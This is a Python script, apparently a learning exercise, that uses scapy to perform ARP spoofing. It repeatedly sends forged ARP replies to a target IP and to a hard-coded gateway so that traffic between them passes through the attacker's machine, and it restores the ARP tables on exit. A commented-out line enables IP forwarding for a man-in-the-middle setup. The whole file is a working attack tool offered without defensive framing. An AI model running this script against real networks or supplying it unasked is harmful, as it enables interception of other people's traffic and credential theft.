import time
import sys
import scapy.all as scapy
import argparse
import  subprocess
# subprocess.call("echo 1 > /proc/sys/net/ipv4/ip_forward",shell=True)
def get_arguments():
    parser=argparse.ArgumentParser()
    parser.add_argument("-t","--ipadd",dest="pdst",help="ip address of receiver")
    # parser.add_argument("-m","--mac",dest="hwdst",help="mac address of receiver")
    # parser.add_argument("-i","--interface",dest="interface",help="interface of network")

    arguments_answ=parser.parse_args()
    return arguments_answ
# def current_ip():
#     import subprocess
#     import re
#     result=subprocess.check_output(['ifconfig','eth0'])
#     parsed_result=re.search(r'\d\d\W\d\W\d\W\d.\s',str(result))
#     print(parsed_result.group(0))
def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip) #specified the ip or ips to which we want to sent a arp request
    broadcost = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")#used for getting an object ethernet frame which contains the destinmation mac and source mac
    arp_request_broadcast = broadcost/arp_request #combining the packets to make a single packet
    # print(arp_request_broadcast.psrc)
    # print(arp_request_broadcast.hwsrc)
    answered_list = scapy.srp(arp_request_broadcast , timeout=1,verbose=False)[0]#broadcast the packet and receives answered and unanswered packets.
    return answered_list[0][1].hwsrc
def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    response = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    # response.show()
    # print(response.summary())
    scapy.send(response,verbose=False)

def restore(target_ip, source_ip):
    target_mac = get_mac(target_ip)
    source_mac=get_mac(source_ip)
    response = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=source_ip,hwsrc=source_mac)#we set hwsrc i.e source mac because scapy will set our ip by default
    # response.show()
    # print(response.summary())
    scapy.send(response,verbose=False,count=4)
    # response.show()
    # print(response.summary())
args=get_arguments()
target_ip=args.pdst
gatewayip="10.0.2.1"
sent_packets=0
try:
    while True:
        spoof(target_ip,gatewayip)
        spoof(gatewayip,target_ip)
        print("\r[+] packets sent: "+str(sent_packets),end="")
        # sys.stdout.flush()
        sent_packets+=2
        time.sleep(2)
except KeyboardInterrupt:
    restore(target_ip,gatewayip)
    restore(gatewayip,target_ip)
    print("[+] detected ctrl + c .quiting")